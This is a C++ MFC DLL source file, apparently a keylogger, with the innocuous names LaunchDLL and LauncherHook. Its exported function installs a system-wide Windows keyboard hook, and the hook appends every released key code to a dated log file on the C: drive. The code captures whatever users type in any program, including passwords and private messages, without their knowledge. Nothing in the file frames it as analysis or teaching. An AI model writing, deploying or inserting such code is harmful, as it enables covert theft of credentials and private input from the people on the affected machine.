// LaunchDLL.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "LaunchDLL.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


HHOOK Hook;
LRESULT CALLBACK LauncherHook(int nCode,WPARAM wParam,LPARAM lParam);
void SaveLog(char* c);
//
//	Note!
//
//		If this DLL is dynamically linked against the MFC
//		DLLs, any functions exported from this DLL which
//		call into MFC must have the AFX_MANAGE_STATE macro
//		added at the very beginning of the function.
//
//		For example:
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// normal function body here
//		}
//
//		It is very important that this macro appear in each
//		function, prior to any calls into MFC.  This means that
//		it must appear as the first statement within the 
//		function, even before any object variable declarations
//		as their constructors may generate calls into the MFC
//		DLL.
//
//		Please see MFC Technical Notes 33 and 58 for additional
//		details.
//

/////////////////////////////////////////////////////////////////////////////
// CLaunchDLLApp

BEGIN_MESSAGE_MAP(CLaunchDLLApp, CWinApp)
	//{{AFX_MSG_MAP(CLaunchDLLApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CLaunchDLLApp construction

CLaunchDLLApp::CLaunchDLLApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CLaunchDLLApp object

CLaunchDLLApp theApp;

DllExport void WINAPI InstallLaunchEv()

{
Hook=(HHOOK)SetWindowsHookEx(WH_KEYBOARD,

							(HOOKPROC)LauncherHook,

							theApp.m_hInstance,

							0);

}


LRESULT CALLBACK LauncherHook(int nCode,WPARAM wParam,LPARAM lParam)

{
	LRESULT Result=CallNextHookEx(Hook,nCode,wParam,lParam);
	if(nCode==HC_ACTION)
	{
		if(lParam & 0x80000000)
		{
			char c[1];
			c[0]=wParam;
			SaveLog(c);
		}
	}
	return Result;
}


void SaveLog(char* c)

{
	CTime tm=CTime::GetCurrentTime();
	CString name;
	name.Format("c:\\Key_%d_%d.log",tm.GetMonth(),tm.GetDay());
	CFile file;
	if(!file.Open(name,CFile::modeReadWrite))
	{
	file.Open(name,CFile::modeCreate|CFile::modeReadWrite);
	}
	file.SeekToEnd();
	file.Write(c,1);
	file.Close();
}